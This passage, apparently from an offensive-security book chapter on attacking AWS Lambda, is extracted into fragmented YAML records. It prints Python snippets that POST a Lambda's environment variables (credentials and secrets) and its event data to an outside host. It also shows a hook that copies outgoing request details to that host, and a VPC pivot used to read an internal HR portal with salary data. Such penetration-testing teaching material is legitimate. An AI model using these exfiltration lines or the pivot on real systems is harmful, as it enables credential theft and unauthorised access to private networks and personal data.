- en: 'def lambda_handler(event, context):'
  prefs: []
  type: TYPE_NORMAL
- en: ec2 = boto3.client('ec2')
  prefs: []
  type: TYPE_NORMAL
- en: reservations = ec2.describe_instances()['Reservations']
  prefs: []
  type: TYPE_NORMAL
- en: print(json.dumps(reservations, indent=2, default=str))
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE22]'
  prefs: []
  type: TYPE_PRE
- en: 'try:'
  prefs: []
  type: TYPE_NORMAL
- en: s3 = boto3.client('s3')
  prefs: []
  type: TYPE_NORMAL
- en: print(s3.list_buckets())
  prefs: []
  type: TYPE_NORMAL
- en: 'except:'
  prefs: []
  type: TYPE_NORMAL
- en: pass
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE23]'
  prefs: []
  type: TYPE_PRE
- en: from botocore.vendored import requests
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE24]'
  prefs: []
  type: TYPE_PRE
- en: 'try:'
  prefs: []
  type: TYPE_NORMAL
- en: import os
  prefs: []
  type: TYPE_NORMAL
- en: from botocore.vendored import requests
  prefs: []
  type: TYPE_NORMAL
- en: requests.post('http://1.1.1.1', json=os.environ.copy(), timeout=0.01)
  prefs: []
  type: TYPE_NORMAL
- en: 'except:'
  prefs: []
  type: TYPE_NORMAL
- en: pass
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE25]'
  prefs: []
  type: TYPE_PRE
- en: 'try:'
  prefs: []
  type: TYPE_NORMAL
- en: from botocore.vendored import requests
  prefs: []
  type: TYPE_NORMAL
- en: requests.post('http://1.1.1.1', json=event, timeout=0.01)
  prefs: []
  type: TYPE_NORMAL
- en: 'except:'
  prefs: []
  type: TYPE_NORMAL
- en: pass
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE26]'
  prefs: []
  type: TYPE_PRE
- en: 'try:'
  prefs: []
  type: TYPE_NORMAL
- en: 'data = {''url'': url, ''params'': params, **kwargs}'
  prefs: []
  type: TYPE_NORMAL
- en: request('POST', 'http://1.1.1.1', json=data, timeout=0.01)
  prefs: []
  type: TYPE_NORMAL
- en: 'except:'
  prefs: []
  type: TYPE_NORMAL
- en: pass
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE27]'
  prefs: []
  type: TYPE_PRE
- en: aws ec2 describe-instances
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE28]'
  prefs: []
  type: TYPE_PRE
- en: 'try:'
  prefs: []
  type: TYPE_NORMAL
- en: from botocore.vendored import requests
  prefs: []
  type: TYPE_NORMAL
- en: req = requests.get('http://172.31.32.192/')
  prefs: []
  type: TYPE_NORMAL
- en: print(req.text)
  prefs: []
  type: TYPE_NORMAL
- en: 'except:'
  prefs: []
  type: TYPE_NORMAL
- en: pass
  prefs: []
  type: TYPE_NORMAL
- en: '```'
  prefs: []
  type: TYPE_NORMAL
- en: To keep it simple, we'll just be printing the output to the console and viewing
    it there, but this is another situation where some sort of exfiltration may be
    necessary. Ensure that your Lambda function has internet access, though, as they
    lose default internet access when launched into a VPC and rely on the VPC to provide
    that access.
  prefs: []
  type: TYPE_NORMAL
- en: 'After running the payload to try to make an HTTP request to that internal IP,
    we are shown the following in the Lambda console:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/c8ed9d36-5578-42ed-8b50-ce50c7e375a8.png)'
  prefs: []
  type: TYPE_IMG
- en: We contacted the internal server and received a response
  prefs: []
  type: TYPE_NORMAL
- en: Just like that, we can see that we gained access to the internal network to
    bypass network restrictions and accessed some sort of internal human resources
    portal for the company we are targeting. At the bottom, we can even see a table
    with some private employee information, such as their salary.
  prefs: []
  type: TYPE_NORMAL
- en: It's that easy to gain access to the internal side of a network in AWS. This
    method can be used for a variety of different attacks, such as accessing an RDS
    database that is not publicly accessible, because we can just launch a Lambda
    function into the VPC/subnet that it resides in and make a connection to it. All
    kinds of AWS services have the option to launch a resource into a private VPC
    to disable public access to it, and this method of getting into the internal side
    of a VPC allows us to access all these different services; a few other examples
    include `ElastiCache` databases, EKS clusters, and more.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: AWS Lambda is an extremely versatile and useful service for both AWS users and
    attackers alike. There are many possibilities for we can use Lambda to our benefit
    as attackers, and one of the best things is that our target doesn't even necessarily
    need to be using Lambda themselves for it to benefit us.
  prefs: []
  type: TYPE_NORMAL
- en: Due to the many different use cases for Lambda, it is always one of the more
    high-priority services to check out, as it can often yield very fruitful attack
    paths to allow us to gain further access to an AWS environment. Another thing
    to keep in mind is that with many services, including Lambda, they are constantly
    evolving, opening and closing different attack paths that we can make use of;
    it is important to stay up to date and knowledgeable, because the accounts we
    are attacking will be making use of those changes, as well.
  prefs: []
  type: TYPE_NORMAL
